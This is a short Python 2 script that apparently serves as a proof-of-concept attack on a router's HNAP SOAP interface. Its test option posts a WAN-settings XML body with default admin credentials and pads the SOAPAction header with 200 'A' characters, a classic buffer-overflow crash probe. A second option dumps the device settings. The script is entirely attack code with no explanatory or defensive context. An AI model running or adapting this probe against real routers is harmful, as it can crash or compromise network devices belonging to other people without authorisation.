#!/usr/bin/env python

# /proc/net/route (get AP ip)


import sys
import socket
import getopt
import requests


url = 'http://192.168.0.1/HNAP/'

bug = 'A'*200

def test():
    payload =   """
                   <?xml version="1.0" encoding="utf-8"?>
                        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
                        <soap:Body>
                        <GetWanSettingsResponse xmlns="http://purenetworks.com/HNAP1/">i
                        <Type>DHCP</Type>
                        <Username></Username>
                        <Password></Password>
                        <MaxIdleTime>300</MaxIdleTime>
                        <HostName>ZZZZZZ</HostName>
                        <ServiceName></ServiceName>
                        <AutoReconnect>true</AutoReconnect>
                        <IPAddress>0.0.0.0</IPAddress>
                        <SubnetMask>0.0.0.0</SubnetMask>
                        <Gateway>0.0.0.0</Gateway>
                        <DNS><Primary></Primary>
                        <Secondary></Secondary>
                        </DNS>
                        <OpenDNS><enable>false</enable></OpenDNS>
                        <MacAddress></MacAddress>
                        <MTU>1500</MTU>

                        </GetWanSettingsResponse>
                        </soap:Body>
                        </soap:Envelope>
                """

    headers = { 'content-type': 'text/xml', 'SOAPAction' : 'http://purenetworks.com/HNAP1/'+bug+''}
    r = requests.post( url, auth=('admin', ''), headers=headers, data=payload )

    print r.content

def getDeviceSettings():
    r = requests.get( url )
    print r.content

def main():

    # read the command line options
    try:
        opts, args = getopt.getopt(sys.argv[1:], "st", ["settings", "test"])
    except getopt.GetoptError as err:
        print str(err)
        sys.exit(-1)

    for o, a in opts:
        if o in ("-s", "--settings"):
            getDeviceSettings()
        elif o in ("-t", "--test"):
            test()
        else:
            assert False, "Unhandled Option"


if __name__ == "__main__":
	main()
